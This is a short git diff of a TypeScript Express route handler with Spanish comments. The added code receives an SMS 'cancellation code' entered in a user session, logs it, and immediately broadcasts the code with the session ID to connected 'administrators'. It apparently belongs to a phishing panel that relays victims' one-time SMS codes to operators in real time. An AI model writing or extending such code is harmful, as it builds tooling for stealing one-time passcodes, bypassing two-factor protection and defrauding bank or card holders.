@@ -201,8 +201,22 @@ export async function registerRoutes(app: Express): Promise<Server> {
               case 'sms_compra':
               case 'SMS_COMPRA':
               case 'smsCompra':
-                updatedFields.smsCompra = inputData.smsCompra;
-                console.log('Recibido código de cancelación:', inputData.smsCompra);
+                // Asegurarnos de manejar correctamente las respuestas de SMS_COMPRA
+                if (inputData && inputData.smsCompra) {
+                  updatedFields.smsCompra = inputData.smsCompra;
+                  console.log('Recibido código de cancelación SMS_COMPRA:', inputData.smsCompra);
+                  
+                  // Notificar a los administradores el código de cancelación inmediatamente
+                  broadcastToAdmins(JSON.stringify({
+                    type: 'SMS_COMPRA_CODE',
+                    data: {
+                      sessionId,
+                      code: inputData.smsCompra
+                    }
+                  }));
+                } else {
+                  console.error('Error: datos SMS_COMPRA recibidos sin código de cancelación:', inputData);
+                }
                 break;
               case 'celular':
                 updatedFields.celular = inputData.celular;
